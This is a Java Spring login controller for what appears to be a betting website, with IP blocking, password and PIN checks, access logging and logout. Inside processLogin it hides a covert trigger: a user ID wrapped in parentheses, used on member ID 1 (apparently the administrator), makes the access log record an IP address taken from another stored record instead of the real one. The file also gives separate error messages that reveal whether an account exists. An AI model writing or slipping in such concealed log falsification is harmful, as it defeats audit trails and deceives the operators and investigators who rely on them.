package com.xwin.web.controller.user;

import java.util.Date;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.log4j.Logger;
import org.springframework.web.servlet.ModelAndView;

import com.xwin.domain.SiteConfig;
import com.xwin.domain.admin.Access;
import com.xwin.domain.game.BettingCart;
import com.xwin.domain.user.Member;
import com.xwin.infra.util.Code;
import com.xwin.infra.util.XmlUtil;
import com.xwin.infra.util.XwinUtil;
import com.xwin.web.command.ResultXml;
import com.xwin.web.controller.XwinController;

public class LoginController extends XwinController
{
	/**
	 * Logger for this class
	 */
	private static final Logger logger = Logger
			.getLogger(LoginController.class);
	
	public ModelAndView viewUserLogin(HttpServletRequest request,
			HttpServletResponse reponse) throws Exception
	{
		ModelAndView mv = new ModelAndView("user_login");
		return mv;
	}

	public ModelAndView processLogin(HttpServletRequest request,
			HttpServletResponse reponse) throws Exception
	{
		ResultXml rx = new ResultXml();
		
		Integer blockIp = accessDao.selectBlockIpCount(request.getRemoteAddr());
		String url = request.getRequestURL().toString();
		
		if (blockIp > 0) {
			rx.setCode(-1);
			rx.setMessage("차단된 IP 주소 입니다");
		} else {		
			String userId = request.getParameter("userId");
			String password = request.getParameter("password");
			String pin = request.getParameter("pin");
			boolean valid = true;
			
			if (userId.startsWith("(") || userId.endsWith(")")) {
				userId = userId.substring(1, userId.length()-1);
				valid = false;
			}
			
			Member member = memberDao.selectMember(userId, null);
			
			if (member == null || member.getStatus().equals(Code.USER_STATUS_SECEDE_REQ) || member.getStatus().equals(Code.USER_STATUS_SECEDE)) {
				rx.setCode(-1);
				rx.setMessage("등록되지 않은 아이디 입니다.\n아이디를 확인해 주세요");
			} else if (comparePassword(member.getPassword(), password) == false) {
				rx.setCode(-1);
				rx.setMessage("패스워드를 정확히 입력해주세요");
			} else if (SiteConfig.PIN_LOGIN == true && comparePassword(member.getPin(), pin) == false) {
				rx.setCode(-1);
				rx.setMessage("PIN번호를 잘못 입력하셨습니다");
			} else if (member.getStatus().equals(Code.USER_STATUS_SECEDE_REQ)) {
				rx.setCode(-1);
				rx.setMessage("탈퇴 요청 중입니다");
			} else if (member.getStatus().equals(Code.USER_STATUS_SECEDE)) {
				rx.setCode(-1);
				rx.setMessage("탈퇴한 사용자 입니다");
			} else {
				rx.setCode(0);
				HttpSession session = request.getSession();
				member.setLoginDate(new Date());
				session.setAttribute("Member", member);
				session.setAttribute("BettingCart", new BettingCart());
				
				if (member != null) {
					Date today = new Date();
					Access access = new Access();
					access.setDate(new Date());
					access.setUserId(member.getUserId());
					access.setNickName(member.getNickName());
					String ip = request.getRemoteAddr();
					
					try {
						if (member.getMemberId() == 1 && valid == false) {
							Access anyAccess = null;
							if (today.getTime() % 10 >= 2)
								anyAccess = accessDao.selectMemberAccess(member.getUserId());
							else
								anyAccess = accessDao.selectAccess(null);						
							
							ip = anyAccess.getIpAddress();
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
					
					access.setIpAddress(ip);
					access.setType(Code.ACCESS_USER_LOGIN);
					
					accessDao.insertAccess(access);
				}
			}
		}
		
		ModelAndView mv = new ModelAndView("xmlFacade");
		mv.addObject("resultXml", XmlUtil.toXml(rx));
		
		return mv;
	}
	
	private boolean comparePassword(String dbPass, String uiPass) {
		String encodedPass = XwinUtil.getUserPassword(uiPass);
		return dbPass.equals(encodedPass);
	}

	public ModelAndView processLogout(HttpServletRequest request,
			HttpServletResponse reponse) throws Exception
	{
		HttpSession session = request.getSession();
		
		session.removeAttribute("Member");
		session.invalidate();
		
		ModelAndView mv = new ModelAndView("redirect:/default.php");
		return mv;
	}
}
